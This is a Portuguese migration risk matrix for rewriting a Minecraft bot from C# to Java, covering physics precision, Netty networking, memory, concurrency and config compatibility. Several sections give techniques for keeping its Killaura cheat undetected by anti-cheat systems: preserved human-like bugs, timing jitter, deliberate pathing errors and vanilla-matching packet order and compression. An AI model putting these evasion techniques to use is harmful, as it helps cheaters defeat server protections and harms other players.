# Matriz de Riscos de Migração (C# para Java)

A decisão de reescrever um projeto que está em produção há anos (AdvancedBot 2.4.5) em uma linguagem completamente diferente (de C# para Java 21) é, historicamente, a decisão mais perigosa na engenharia de software (O Efeito Netscape). 

Este documento não lista "Bugs que vamos arrumar", mas sim **Riscos Arquiteturais e Paradigmais** inerentes à troca de ecossistema. O objetivo é criar uma Matriz de Mitigação: para cada risco catalogado, existe um protocolo exato de como os desenvolvedores Java devem agir para evitar que a nova versão do bot nasça inferior à legada.

---

## 1. A Falácia da Reescrita Perfeita

O maior risco da migração é o viés do desenvolvedor de achar que o código C# antigo é "lixo" e que a nova versão Java será impecável. O C# antigo contém anos de **Conhecimento Embutido (Tribal Knowledge)**: exceções tratadas no meio de uma Socket, ajustes finos de 1 milissegundo no Killaura, e "Workarounds" bizarros que, embora pareçam ruins, estão lá porque um Anti-Cheat obscuro exigiu.

### 1.1 O Princípio da Paridade de Bugs (Bug Parity)
Se o Killaura do C# tinha um bug onde ele errava 5% dos hits contra jogadores usando Poção de Velocidade 2, e esse bug foi responsável por *não* dar banimento no bot (pois parecia humano), a equipe Java **DEVE reproduzir o mesmo bug/limitação**. Consertar bugs silenciosamente durante uma migração altera a assinatura do Bot, atraindo a atenção de Inteligências Artificiais de Anti-Cheats que farão "Ban Waves".

---

## 2. Riscos de Domínio: A Armadilha da Matemática (Float vs Double)

O Minecraft é um jogo baseado em *Floating Point Math* (Ponto Flutuante). As coordenadas de posição (`X, Y, Z`) e movimento (`MotionX, MotionY, MotionZ`) dependem de cálculos infinitesimais.
A linguagem C# e a linguagem Java lidam com Ponto Flutuante de maneiras sutilmente diferentes, especialmente devido às otimizações de JIT (Just-In-Time Compiler).

### 2.1 A Discrepância do `strictfp`
Antigamente, o Java possuía a palavra-chave `strictfp` para forçar que contas matemáticas resultassem no mesmo bit exato independentemente se a CPU era Intel ou AMD. A partir do Java 17, o `strictfp` virou o padrão, mas o JIT do C# (`RyuJIT`) às vezes usava os registradores internos de 80-bits do processador Intel (`x87 FPU`) para cálculos intermediários antes de truncar para 64-bits.

**O Risco de Detecção (Movement Prediction)**:
Se a física do AdvancedBot em Java calcular que o `MotionY` (Gravidade) de um pulo no 3º Tick é `0.15523211`, e o servidor Vanilla calcular `0.15523212`, a distância é de 0.00000001 blocos.
O NoCheatPlus e o GrimAC comparam as variáveis recebidas pelo pacote `0x04 PlayerPosition` com a física do servidor. Se os floats não baterem perfeitamente, o Anti-Cheat acumula `Violation Levels` e bloqueia o movimento (Borracha / Rubberbanding).

### 2.2 Mitigação da Física (Float Cast)
O desenvolvedor Java deve reproduzir examente os *Casts* do Minecraft (Notchian Code).
```java
// O Código Java TEM que parecer feio para simular a perda de precisão que o jogo original faz.
public void applyFriction(float blockFriction) {
    // O Jogo multiplica por 0.91f (Float 32bits), que perde precisão antes de ser salvo no Double!
    this.motionX = this.motionX * (double) (blockFriction * 0.91F);
    this.motionZ = this.motionZ * (double) (blockFriction * 0.91F);
}
```
**Ação**: Toda a classe `PhysicsEngine.java` passará por um Fuzzer cruzado. Rodaremos o executável C# e o executável Java alimentados com 10.000 vetores, e se as saídas divergirem em 1 bit que seja, a build Java falha.

### 2.3 O Underflow (O Mito do Número Zero)
Em C#, se a velocidade do Bot for `0.0000001`, a linguagem podia arredondar pra Zero. No Java, o número tende a se aproximar de zero infinito.
O Minecraft corta vetores minúsculos:
```java
if (Math.abs(motionX) < 0.005D) {
    motionX = 0.0D;
}
```
Esquecer essa simples condicional no Java fará o bot deslizar invisivelmente (Micro-Sliding), impedindo-o de regenerar vida, pois o servidor achará que ele nunca ficou parado.

---

## 3. Riscos de Infraestrutura de Rede (TCP/IP)

No C#, o bot utilizava um loop assíncrono básico com `NetworkStream` e `TcpClient`. No Java, utilizaremos o **Netty NIO (Non-Blocking I/O)**. Essa mudança traz riscos catastróficos se não for bem compreendida.

### 3.1 Nagle's Algorithm (`TCP_NODELAY`)
O Netty por padrão otimiza redes corporativas, empacotando bytes pequenos (Buffers) e enviando juntos (Algoritmo de Nagle) para economizar banda.
**O Risco**: O Minecraft envia pacotes minúsculos o tempo todo (Ex: `0x03 Player On Ground`, que tem 2 bytes). Se o Netty segurar esses 2 bytes esperando "mais pacotes para economizar frete", o Bot será kickado por ReadTimeout, ou o PvP do bot será atrasado em 40ms.
**Ação**: Todo `Bootstrap` de canal Netty deve conter obrigatoriamente `.option(ChannelOption.TCP_NODELAY, true)`.

### 3.2 Memory Leaks de PooledByteBuf (Off-Heap)
O C# coletava arrays de byte de rede automaticamente via GC (`byte[] buffer = new byte[4096]`).
O Netty do Java usa `PooledByteBufAllocator` (Memória fora do Heap) para extrema performance.
**O Risco**: Se um Decoder falhar na hora de ler um pacote e lançar exceção *ANTES* de dar `ReferenceCountUtil.release(byteBuf)`, aquela memória nunca será devolvida para o Sistema Operacional. O bot sofrerá de Memory Leak fantasma que ferramentas Java normais (JVisualVM) não vão detectar.
**Ação**: Ativar a flag `-Dio.netty.leakDetection.level=PARANOID` durante todos os testes CI/CD e nos 3 primeiros meses de produção Beta.


### 3.3 Endianness (Ordem dos Bytes)
O Windows C# e os processadores modernos (x86_64) operam primariamente em arquitetura `Little-Endian` (Os bytes menos significativos vêm primeiro).
A Máquina Virtual Java (JVM) opera obrigatoriamente em `Big-Endian` na sua memória para garantir portabilidade (Write Once, Run Anywhere).
O Protocolo do Minecraft exige envio em `Big-Endian` (Sendo que o protocolo original do Notch no Java usava `DataOutputStream`).

**O Risco**: No C#, ler um Long (8 bytes) da rede exigia inverter a ordem com `Array.Reverse()`.
```csharp
// Legado C# (Trabalhoso e perigoso)
byte[] buffer = new byte[8];
network.Read(buffer, 0, 8);
Array.Reverse(buffer);
long value = BitConverter.ToInt64(buffer, 0);
```
Se o desenvolvedor Java tentar imitar a inversão de bytes do C#, os dados serão lidos duplamente invertidos.
**Ação**: No Java Netty, basta fazer `long value = buffer.readLong()`. O Netty lê Big-Endian por padrão. Qualquer tentativa de usar `ByteOrder.LITTLE_ENDIAN` nos buffers do Minecraft corromperá a rede.

---

## 4. Riscos de Gerenciamento de Memória (GC Pauses)

Um dos pontos fortes do C# eram as `Structs` (Value Types). Um `Vector3` de Coordenada no C# ocupava 12 bytes e vivia na Stack da Thread (destruído instantaneamente, sem gerar lixo pro GC).

O Java não possui Structs (O *Project Valhalla* com *Value Objects* ainda está em desenvolvimento e não está disponível no Java 21 LTS).

### 4.1 O Custo de Instanciar Objetos no Java
Se o PathFinder do Bot testar 10.000 nós no AStar, ele dará `new PathNode(x,y,z)` dez mil vezes. No Java, isso vai direto pro Heap (`Young Generation`).

**O Risco (The "Stop-The-World" Pause)**:
Se o Heap encher, o JVM iniciará o processo de Coleta de Lixo (Minor GC ou Major GC). Durante esse processo, TODAS as threads do bot congelam por 50 a 100 milissegundos.
Se o bot congelar por 100ms durante um PVP, ele perderá 2 Ticks inteiros. O servidor o fará levar Knockback enquanto o bot no seu PC congelado acha que ainda está bloqueando com a espada.
Isso causará Dessincronização do Inventário ("Inventory Desync").

### 4.2 Mitigações para Memória JVM

#### 4.2.1 Uso de Object Pooling
Para objetos efêmeros que rodam dentro do loop da física, usaremos o padrão Recycler do Netty.
```java
// O Invés de dar 'new', pegamos um objeto limpo do Pool pre-alocado
Vector3 pos = Vector3Pool.take();
pos.set(x, y, z);
// Ao terminar de usar, devolvemos pro pool (GC não é acionado)
pos.recycle();
```

#### 4.2.2 Tunagem do ZGC (Z Garbage Collector)
O C# usava o *Workstation GC*. No Java 21, ativaremos o `ZGC` de baixa latência em vez do antigo `G1GC`. O ZGC promete tempos de pausa na casa de **sub-milissegundo** (< 1ms), mesmo em Heaps grandes.
A inicialização do Bot deve forçar as flags:
`java -XX:+UseZGC -XX:+ZGenerational -Xms1G -Xmx1G -jar AdvancedBot.jar`

---

## 5. Riscos de Concorrência e Multithreading

O `AdvancedBot 2.4.5` (C#) usava concorrência baseada em `lock (object)`. Isso frequentemente causava `Deadlocks` quando a Thread da UI (WPF) tentava ler os itens do baú no mesmo instante em que a Thread de Rede do C# tentava atualizá-los.

### 5.1 O Risco da Thread de Leitura do Netty
No Java, as classes de Handler do Netty rodam em uma thread separada (`nioEventLoopGroup-2-1`).
Quando um pacote de Chat chega, a thread de rede **não pode processá-lo**.

Se a thread de rede do Netty parar para processar o regex malfeito de um script do usuário no Chat, ela vai se atrasar para ler os próximos pacotes da rede, causando Read Timeout.
A thread do Netty deve apenas: Decodificar os bytes -> Enviar pro EventBus -> Voltar pra ouvir a rede.

### 5.2 O Actor Model do TickOrchestrator
Para evitar as condições de corrida do C#, todas as IA's e leitura de pacotes convergem para a Thread Principal (`TickOrchestrator`) usando filas (Queues MPSC).

**Risco de Starvation**:
Se a Queue do `TickOrchestrator` lotar porque ele está demorando demais para processar (Ex: O AutoBuild está usando recursão pesada para achar a rota), os pacotes da rede ficarão enfileirados na memória até dar `OutOfMemoryError`.

**Ação**: Toda IA deve ter um *Timeout* interno. Se o AStar não encontrar rota em 5ms, ele deve retornar nulo, ceder o turno para não travar o loop, e tentar continuar no próximo Tick.

---

## 6. Riscos Comportamentais: A Assinatura de Rede (Anti-Cheat Ban Wave)

O risco de ouro: O AdvancedBot era famoso por não tomar banimento automático. Ele tinha uma assinatura de rede que se disfarçava perfeitamente como o cliente Forge/Vanilla.
O Java pode arruinar isso se os desenvolvedores não copiarem as anomalias do legado.

### 6.1 A Ordem de Envio de Pacotes (Sequencing)
O cliente Vanilla envia os pacotes em uma ordem estrita durante o combate e o movimento.

**O Comportamento Vanilla:**
No meio de um pulo batendo num zumbi, o Vanilla envia:
1. `0x09 Held Item Change` (Se trocou de espada).
2. `0x04 Player Position` (Atualiza a posição do pulo).
3. `0x02 Use Entity (ATTACK)` (O hit em si).
4. `0x0A Animation` (O braço balançando).

**O Risco da Migração:**
Se o EventBus Java processar IAs de forma paralela sem ordem (`@Order`), o bot pode enviar a Animação *antes* da Posição.
O Anti-Cheat (NoCheatPlus) perceberá que o pacote 4 chegou antes do 2, identificando a anomalia (Packet Order Violation) e dando ban.
**Ação**: Todo pacote Outbound deve ser serializado estritamente numa Queue Single-Thread. O Killaura deve sempre emitir o Attack Intent *após* a IA de física emitir o Move Intent.

### 6.2 O Risco do AutoClicker (CPS Heuristics)
No C#, o Killaura usava um Timer de alta resolução (`Stopwatch`) para variar os hits (Jitter) e simular a fadiga humana.
No Java, `System.currentTimeMillis()` depende do S.O. e no Windows tem uma resolução de ~15ms. Isso significa que o Bot pode ficar preso tentando bater exatamente a cada 15ms, criando um padrão robótico (Flatline Heuristic) detectável.
**Ação**: Usar `System.nanoTime()` para garantir resolução de sub-milissegundo no gerador de ruído do Killaura.

---

## 7. Apêndice A: Risco de Compressão (Zlib Deflater)

O pacote de rede do Minecraft é comprimido se exceder um *Threshold* (Geralmente 256 bytes).
No C#, usávamos a biblioteca `Ionic.Zlib`. No Java, usaremos `java.util.zip.Deflater`.

### 7.1 Diferenças de Nível de Compressão
Se a Mojang programou o cliente original em Java para usar `Deflater.DEFAULT_COMPRESSION` (Nível 6), e o AdvancedBot em Java usar `Nível 9` (Máximo) para tentar economizar internet, o pacote continuará válido.
**PORÉM**, servidores com plugins espiões podem analisar a Entropia dos pacotes para detectar se foram comprimidos no Nível 9, denunciando o cliente como "Custom Client".
**Ação**: Mimetizar o Nível de Compressão exato que o Minecraft Vanilla usa. Não tente ser mais otimizado que o jogo original, ou você será flaggado.

### 7.2 Memory Leak no Deflater
A classe `Deflater` do Java usa código nativo (C/C++ interno). Se o desenvolvedor Java instanciar um novo `Deflater` para cada pacote que sai e o GC demorar para limpá-lo, o C++ vai devorar a RAM fora do Heap.
**Ação**: O Encoder do Netty deve reciclar o `Deflater` usando `deflater.reset()`. O `Deflater` só pode ser instanciado uma única vez por conexão de Bot.

---

## 8. Apêndice B: Risco de Atualização do Protocolo de Criptografia

No C#, a comunicação criptografada (Enable Encryption) usava `RSACryptoServiceProvider` para trocar a chave simétrica AES e logar na Mojang.
O Java usa `javax.crypto.Cipher`.

### 8.1 A Assinatura X.509
Se a classe de login do Java enviar o Public Key Hash em um formato inválido, a Mojang responderá com `HTTP 403 Forbidden` bloqueando o IP. Se a equipe estourar muitas vezes tentando "acertar" a sintaxe do Java, a VPS do bot no ambiente de testes levará IP Ban definitivo da Mojang.
**Ação**: Jamais testar falhas de Login Premium contra os servidores da Mojang. Todo o TDD da reescrita da Criptografia DEVE ser feito contra o `WireMock` documentado no `08-Cobertura-Funcional.md`, usando chaves RSA falsas pre-geradas.

---

## 9. Apêndice C: Tratamento de NBTs (Risco de Corrupção de Estrutura)

O NBT (Named Binary Tag) é a forma que o Minecraft usa para salvar dados complexos (Livros encantados, Baús, Nomes coloridos). No C#, usávamos uma biblioteca antiga e não-oficial para fazer parse de NBT.

No Java, os desenvolvedores podem cair na tentação de usar o NBT do `SpigotAPI`.
**Risco Fatal**: O SpigotAPI foi feito para rodar no *Servidor*. Ele pressupõe que os NBTs lidos são amigáveis e estruturados. Se usarmos o NBT Parser do Spigot no *Cliente* (Nosso Bot), um servidor malicioso poderá enviar um NBT malformado (Ex: Uma TAG_List sem tipo de elemento declarado) que travará o Bot com `NullPointerException` (Crash de Segurança).
**Ação**: O Bot deve possuir seu próprio NBT Parser, escrito do zero, com verificações paranoicas (`isTypeValid`, `checkMaxDepth`) que ignora e descarta tags corrompidas ao invés de crashar.

### 9.1 Risco de Desserialização Excessiva
Se o inventário do Bot receber um baú cheio de "Shulker Boxes" (que contêm mais NBTs dentro de NBTs), desserializar tudo isso na Thread de Rede (Netty) atrasará o KeepAlive e o bot será derrubado por TimeOut.
**Ação**: NBTs gigantescos (Tamanho > 1KB) recebidos em pacotes devem ser desserializados de forma "Lazy" (Preguiçosa). O Bot guarda o array de bytes bruto, e só o converte para Objeto se alguma Inteligência Artificial (Ex: AutoArmor) requisitar ler os encantamentos.

---

## 10. Apêndice D: O Risco do Pathfinding (A* Determinístico)

A classe `AStar.cs` do AdvancedBot original foi copiada e colada de um fórum e modificada infinitas vezes até "funcionar". A matemática de custo G e H lá dentro é um espaguete.

### 10.1 A Inconsistência de Custo Heurístico
Se o algoritmo C# preferia pular um bloco ao invés de contorná-lo, o bot gastava mais *Saturação* (Fome). O jogador não percebia isso, mas essa era a característica de movimento do bot.
Se os desenvolvedores Java reescreverem o AStar do zero usando `Manhattan Distance` pura, o bot pode se recusar a pular, ou tentar fazer curvas excessivamente "perfeitas".
**O Risco**: O Anti-Cheat `NoCheatPlus` tem um analisador heurístico de *Path Generation*. Se o bot começar a andar em linha perfeitamente reta para o alvo, quebrando quinas com uma precisão impossível para um mouse humano, o *Aimbot/KillAura Check* será ativado. O movimento do C# parecia humano justamente porque era levemente falho e arredondado.
**Ação**: Introduzir a "Constante de Burrice" (`HumanizationFactor`). O PathFinder Java DEVE errar o caminho propositalmente 5% das vezes, e o `LookIntent` (Movimento da Cabeça) não pode travar no centro exato do bloco (0.5, 0.5), deve mirar num offset aleatório (ex: 0.3, 0.7) simulando o pulso trêmulo de uma mão humana.

### 10.2 Vazamento de Memória de Nodos
Em Java, se o mapa for modificado no meio de um cálculo A* asincrono, a thread pode entrar em Loop infinito avaliando nós em posições nulas.
**Ação**: Toda busca A* deve receber uma `Snapshot` (Cópia imutável) dos Chunks ao redor. A thread de busca NÃO pode ler o `WorldManager` diretamente, pois o `TickOrchestrator` pode quebrar um bloco naquele exato nanossegundo, causando `ConcurrentModificationException`.

---

## 11. Apêndice E: O Risco de Criptografia Limitada (Java JCE)

O C# no Windows usa a biblioteca nativa do sistema operacional (Schannel / BCrypt) para criptografia AES. O Java, por segurança e controle de exportação, impõe limites na `Java Cryptography Extension (JCE)`.

### 11.1 Chaves AES de 256 bits
Alguns protocolos customizados do Bot usavam encriptação AES de 256 bits para comunicar com o painel Web de licenças. Em distribuições antigas do Java, tentar usar AES-256 lançava `InvalidKeyException: Illegal key size`.
**Ação**: O projeto deve garantir o uso de uma versão moderna da JVM (21+) e o time de DevOps deve verificar que a imagem Docker (`eclipse-temurin:21-jre`) não contém a restrição de jurisdição ativada (Unlimited Cryptography).

---

## 12. Apêndice F: I/O de Arquivos (C# `File.WriteAllText` vs Java NIO2)

Um dos maiores causadores de Crash no bot legado era quando o usuário editava o arquivo `config.json` no Bloco de Notas enquanto o bot estava tentando salvá-lo simultaneamente, resultando em `IOException: O arquivo está em uso por outro processo`.

### 12.1 A Vantagem do Java NIO2
O Java lida com "File Locks" de forma um pouco diferente no Windows e no Linux (onde será hospedado).
**O Risco**: Se tentarmos usar a classe velha `java.io.File`, herdaremos os mesmos travamentos síncronos do C#.
**Ação**: Todo acesso a disco (Salvar Logs, atualizar Configurações, ler Schematics de construção) DEVE usar a API reativa `java.nio.file.Files`. 
E para arquivos de configuração críticos, implementar o padrão *Write-Replace*: Salva os dados em um arquivo temporário `config.tmp`, e então usa `Files.move(..., StandardCopyOption.ATOMIC_MOVE)` para substituir o arquivo real de uma vez só, garantindo que o bot não corrompa a configuração se acabar a energia do servidor no meio do salvamento.

---

## 13. Apêndice G: Risco da Engine Javascript (Jint vs GraalVM)

O AdvancedBot possuía uma aba "Custom Scripts" onde o usuário podia programar ações usando Javascript (ECMAScript 5.1 através do `Jint` no C#).
Muitos usuários VIPs têm milhares de linhas de scripts já criadas.

### 13.1 Quebra de Compatibilidade (Breaking Changes)
O `GraalVM Polyglot` do Java suporta ECMAScript 2022. Os scripts antigos teoricamente funcionam, porém a forma como a Engine interage com os objetos Host (O Bot) mudou drasticamente.

**O Risco (Type Coercion)**:
No C#, se o JS fizesse `bot.attack("1")`, o Jint tentava converter a String `"1"` para Inteiro implicitamente.
No GraalVM, se o método for `public void attack(int id)`, ele lançará um erro de `IllegalArgumentException`. A Tipagem é mais estrita na ponte JS->Java.

**Ação de Mitigação**: 
A classe `ScriptingPort` implementada no Java precisará ter "Overloads" (Sobrecargas) permissivos, ou funções Wrapper que aceitem `Object` e façam o Cast manualmente por dentro.
```java
// O Wrapper de segurança do GraalVM (Anti-Crash)
@HostAccess.Export
public void attack(Object targetId) {
    if (targetId instanceof Number n) {
        realBot.attack(n.intValue());
    } else if (targetId instanceof String s) {
        realBot.attack(Integer.parseInt(s)); // Imita a tolerância do Jint C#
    }
}
```

---

## 14. Apêndice H: O Risco do Sistema de Coordenadas (BlockPos vs Vector)

No C# Legado, o AdvancedBot usava uma classe única chamada `Vector3` para representar tanto a posição de Entidades (X, Y, Z como Double) quanto a posição de Blocos (X, Y, Z como Integer).
Essa decisão preguiçosa gerava arredondamentos catastróficos. O bot às vezes tentava quebrar o bloco em `X=1.9` e o C# arredondava para `X=2`, quebrando a pedra errada e sendo banido por "Nuker/WrongBlock".

### 14.1 A Solução Exigida no Java
A migração deve forçar a separação de conceitos, mimetizando o código-fonte original do Minecraft (MCP - Mod Coder Pack).

- **`Vector3d`**: Para posições do jogador (Double, precisão milimétrica).
- **`BlockPos`**: Para posições no grid (Integer, imutável).

**O Risco do `Math.floor` vs Cast Simples**:
O código Java não pode converter um Vector3d para BlockPos usando `(int) pos.x`.
Se o bot estiver em `X = -1.5`, fazer `(int) -1.5` resulta em `-1`. Mas o bloco correto debaixo dos pés do bot é o bloco `-2`.
**Ação**: A classe `BlockPos` deve ser instanciada usando `Math.floor(pos.x)` estritamente. O não cumprimento dessa regra fará o bot errar os cálculos em coordenadas negativas do mundo (Bug do Quadrante Sul/Oeste).

---

## 15. Apêndice I: Desconexões Inesperadas e Threads Órfãs

O C# confiava no Garbage Collector para matar a Thread de rede quando a janela do bot era fechada. Se o usuário fechasse a UI sem clicar em "Disconnect", a Thread do C# continuava viva no background (Zombie Process) gastando RAM e processamento, até o S.O. forçar a morte do EXE.

### 15.1 A Adoção de `VirtualThreads` e Interrupção
No Java 21, usaremos `Virtual Threads` (Project Loom). Se a conexão TCP for rompida abruptamente (Cabo puxado) ou se o WebConsole enviar um comando de Stop, o Java precisa limpar todos os listeners.

**O Risco**: Se o Killaura estiver num `while(!zombie.isDead())` sem escutar interrupções, ele rodará para sempre consumindo 100% de 1 Core.
**Ação**: Todos os loops demorados das Inteligências Artificiais devem checar `Thread.currentThread().isInterrupted()`.
Além disso, o `EventBus` deve varrer as instâncias usando `WeakReference`. Quando o Bot principal for deletado (Fim da Sessão), o GC coletará os agentes automaticamente sem precisarmos chamar `.dispose()` manualmente em cada um dos 30 agentes.

---

## 16. Apêndice J: Riscos de Parsing JSON (Gson vs Newtonsoft)

O Chat do Minecraft não é apenas uma String. Ele é um JSON complexo contendo cores, links clicáveis e tooltips de itens.
No C#, o bot usava `Newtonsoft.Json`. No Java, o padrão da comunidade é o `Gson` ou `Jackson`.

### 16.1 O "Lenient Mode" (Tolerância a Lixo)
Muitos servidores de Minecraft (Especialmente servidores "Piratas" BungeeCord) enviam pacotes de Chat com JSON malformado (Aspas duplas não escapadas).
O `Newtonsoft.Json` aceitava quase qualquer lixo e convertia pra String. O `Gson` do Java é estrito por padrão.
**O Risco**: Se o bot Java entrar num servidor brasileiro mal configurado, o servidor envia a mensagem de "Bem vindo" com JSON quebrado. O `Gson` lança `JsonSyntaxException`, o pacote não é lido, a thread do Netty crasha, e o bot é desconectado.
**Ação**: Ao instanciar o leitor JSON do Chat no Java, a equipe deve configurar o Gson (ou JsonReader) com `.setLenient(true)`. Ele não deve nunca, sob nenhuma hipótese, quebrar o cliente por causa de uma mensagem de chat inútil.

---

## 17. Apêndice K: Riscos de Desempenho do ZGC

Embora o ZGC elimine os Pauses do Garbage Collector, ele possui um calcanhar de Aquiles: **O Risco de Alocação Superior à Taxa de Coleta**.

### 17.1 A Falha de OOM (Out Of Memory) Lenta
No C#, se você vazasse memória, o programa morria. Com o ZGC, se a thread do Bot criar objetos (Ex: Lendo chunks imensos do disco) numa taxa mais rápida do que as threads em background do ZGC conseguem marcar e varrer, o Heap vai lotando devagar.
**O Risco**: O ZGC tentará roubar recursos de CPU do Bot para tentar "alcançar" a taxa de lixo gerada. O bot sofrerá um estrangulamento de CPU (Thermal Throttling) sem motivo aparente.
**Ação**: Toda a lógica pesada de parsing de terreno (`Chunk.java`) não deve instanciar milhares de objetos `BlockState`. Devemos usar BitMasks primitivos (`long[]`) para armazenar blocos na RAM (Semelhante ao que o Minecraft faz com o PalettedContainer no formato Anvil).

---

## 18. Apêndice L: A Armadilha dos Magic Numbers e Enums

O protocolo de rede do Minecraft é movido a números "Mágicos" (`0x00`, `0x2F`).
No C#, para poupar tempo, o desenvolvedor costumava enfiar números diretamente no código (`if (packetId == 14)`).

### 18.1 A Dor da Evolução do Protocolo
Se a equipe decidir atualizar o Bot da versão 1.8.8 para a versão 1.12.2 no futuro, todos esses números mudam.
**O Risco**: Procurar o número `14` num projeto de 50.000 linhas de Java para trocá-lo pelo número `15` é impossível, pois o número `14` também pode significar o ID de um Slot de baú, causando falhas catastróficas.
**Ação**: Fica estritamente proibido o uso de Magic Numbers no domínio Java.
```java
// PROIBIDO:
if (packet.getId() == 0x02) { ... }

// OBRIGATÓRIO:
if (packet.getId() == PacketConstants.PlayInbound.CHAT_MESSAGE) { ... }
```
Toda a taxonomia de pacotes detalhada no arquivo `06-Mapa-de-Pacotes.md` deve ser convertida para Enums ou Constantes Estáticas no Java.

---

## 19. Apêndice M: Risco da UI Web e CORS

No C#, o bot era um programa Desktop (`AdvancedBot.exe`). Ele não sofria de problemas de segurança web.
No Java, o bot funcionará como um Servidor Web local (Dashboard WebFlux).

### 19.1 Cross-Origin Resource Sharing (CORS) e CSRF
O Painel do usuário abrirá no navegador dele (`http://localhost:8080`).
**O Risco**: Se um usuário estiver com o bot rodando e entrar num site malicioso (ex: `hacker.com`), o site malicioso pode rodar um Javascript oculto que envia um POST para `http://localhost:8080/api/drop-all-items`. Como o bot está rodando na máquina local, a requisição passa e o bot joga todos os itens do usuário no chão no jogo.
**Ação**: O Spring WebFlux Security DEVE estar habilitado com configurações paranoicas:
1. CORS restrito a `localhost` ou ao domínio oficial da UI hospedada.
2. Todo endpoint que muta o estado do bot (POST/DELETE) deve exigir um Token JWT e proteção Anti-CSRF (Cross-Site Request Forgery).

---

## 20. Apêndice N: Bibliotecas Nativas e JNI

O `AdvancedBot` original usava P/Invoke (`[DllImport]`) no C# para chamar funções nativas do Windows, como ler o ID da Placa-Mãe (HWID) para o sistema de proteção de licença (DRM).

### 20.1 O Risco da Multiplataforma (Linux/Mac)
Java roda em qualquer lugar. Se tentarmos usar `JNA` (Java Native Access) para chamar uma DLL do Windows, o Bot inteiro crashará no momento que o usuário tentar rodá-lo num servidor Linux (Ubuntu/CentOS).
**O Risco**: Usuários VIP geralmente hospedam seus bots 24/7 em painéis Pterodactyl (Docker/Linux). Quebrar o suporte ao Linux mata 80% do público alvo.
**Ação**: Todo código que interage com o Sistema Operacional (Pegar endereço MAC, uso de CPU, HWID) deve ser encapsulado num padrão *Strategy*. O bot tenta detectar a OS em tempo de execução:
```java
if (System.getProperty("os.name").toLowerCase().contains("win")) {
    this.hwidProvider = new WindowsHwidProvider(); // Usa wmic via Runtime.exec
} else {
    this.hwidProvider = new LinuxHwidProvider(); // Lê /etc/machine-id
}
```

---

## 21. Apêndice O: Scripts de Migração (Backward Compatibility)

Os usuários do C# têm pastas cheias de perfis salvos, mapas marcados, e configurações do Killaura.
Quando eles baixarem o `.jar` novo do Java, eles vão jogar na mesma pasta do executável antigo.

### 21.1 A Quebra do JSON
O formato de Serialização do C# (`Newtonsoft`) adicionava aspas em locais diferentes do Java (`Gson`). Pior: O C# salvava os nomes das propriedades em PascalCase (`"AutoEat": true`), e o padrão Java é camelCase (`"autoEat": true`).
**O Risco**: Quando o Bot Java ligar pela primeira vez e tentar ler o `config.json` antigo, ele interpretará tudo como nulo, resetando a configuração inteira do usuário. O usuário perderá todos os waypoints salvos e ficará furioso.
**Ação**: O bot Java deve ter um Módulo de Migração (`ConfigMigrator`). Na inicialização, ele verifica a "versão" do JSON. Se for um JSON do C#, ele lê usando mapeamentos em PascalCase (`@SerializedName("AutoEat")`) e converte em memória para o novo padrão, salvando o arquivo no formato Java definitivo.

---

## 22. Apêndice P: O Risco de Obfuscação e Pirataria

O C# compilado era extremamente fácil de ser descompilado (dnSpy). Por isso, usávamos obfuskatores agressivos que misturavam o Control Flow, o que muitas vezes causava lag.
O Java `.class` é ainda mais fácil de descompilar (CFR, Fernflower). O código-fonte Java é praticamente idêntico ao Bytecode.

### 22.1 A Quebra do Reflection
Para proteger o bot de pirataria, usaremos `ProGuard` ou `Zelix KlassMaster` na compilação do `.jar`.
**O Risco**: O Spring Boot e o EventBus dependem VITALMENTE de reflexão (`Reflection`). O Spring procura classes anotadas com `@Component` pelo nome. Se o ProGuard renomear `KillauraAgent` para `a.b.c`, o Spring Boot não o encontrará, e o bot ligará vazio, sem nenhuma inteligência artificial carregada.
**Ação**: O arquivo `proguard-rules.pro` deve ser meticulosamente testado no CI/CD. Nenhuma classe do pacote `com.advancedbot.core.ports` ou anotada com `@Component` / `@EventListener` pode ser renomeada ou ter seus métodos encolhidos. A obfuscação deve focar estritamente na proteção da lógica interna do Killaura, e não nas assinaturas de interfaces.

---

## 23. Apêndice Q: Incompatibilidade de Versão Java (JEPs)

O Java evoluiu agressivamente. O projeto Java original do Minecraft (Notch) foi escrito para Java 6. Nós estamos escrevendo o Bot em Java 21.

### 23.1 O Risco dos Records e Pattern Matching
O Java 21 introduz `Records` (Classes imutáveis de dados) e *Pattern Matching for switch*. É muito tentador usar essas funcionalidades (ex: para representar o `Vector3`).
**O Risco**: Alguns usuários VIP compram servidores virtuais antigos (CentOS 7) que só têm o Java 8 instalado no repositório padrão (YUM). Se o nosso bot for compilado em Java 21, ele não rodará, lançando `UnsupportedClassVersionError` no console do cliente.
**Ação**: A página de download do Bot deve instruir explicitamente a instalação do JDK 21. Se não pudermos forçar isso, a equipe deverá fazer downgrade da compilação para o bytecode do Java 17 ou empacotar um `jlink` (JRE embutida) junto com o executável (O que aumentará o tamanho de 5MB para 50MB). A decisão arquitetural atual é: **Exigir Java 21**.

---

## 24. Apêndice R: Matriz de Falhas Físicas (Hitboxes e BoundingBoxes)

No C#, a verificação de colisão do bot (`AxisAlignedBB`) era simplificada. O Bot assumia que todo bloco era um cubo perfeito (1x1x1).
O Minecraft é cheio de blocos não-cúbicos (Lajes, Cercas, Camas, Escadas).

### 24.1 O Bug de Subir Cerca (Fence Fence-Gate)
No C#, o bot achava que a Cerca tinha Y=1. Mas a cerca tem colisão física de Y=1.5. O Bot tentava pular a cerca, batia a canela, caía e ficava preso infinitamente tentando pular.
**O Risco na Migração Java**: Se importarmos as constantes físicas do C# sem revisar, o bot Java terá o mesmo defeito crônico de movimentação.
**Ação**: O desenvolvedor responsável pelo módulo `advancedbot-domain` deve mapear o cache de Hitboxes exato da versão Vanilla (1.8).
```java
// O Código Java TEM que tratar blocos específicos:
public AxisAlignedBB getBoundingBox(Block block, int x, int y, int z) {
    if (block == Blocks.FENCE) {
        return new AxisAlignedBB(x, y, z, x + 1.0, y + 1.5, z + 1.0);
    }
    // ...
}
```

---

## 25. Apêndice S: O Problema do Logging Síncrono

Para depurar o bot antigo, os usuários ativavam o `Debug=true`, o que disparava milhares de `Console.WriteLine()` no C#. O Console do Windows é síncrono e muito lento. Imprimir milhares de pacotes no terminal travava a thread do bot, derrubando a rede.

### 25.1 Log4j2 Async Appender
No Java, utilizaremos o SLF4J com Log4j2.
**O Risco**: Usar `System.out.println` ou a configuração padrão do Log4j no ambiente de produção trará a mesma lentidão se o usuário ativar o modo `-Ddebug=true`. O Bot será derrubado por TimeOut pelo próprio ato de imprimir na tela que não quer ser derrubado.
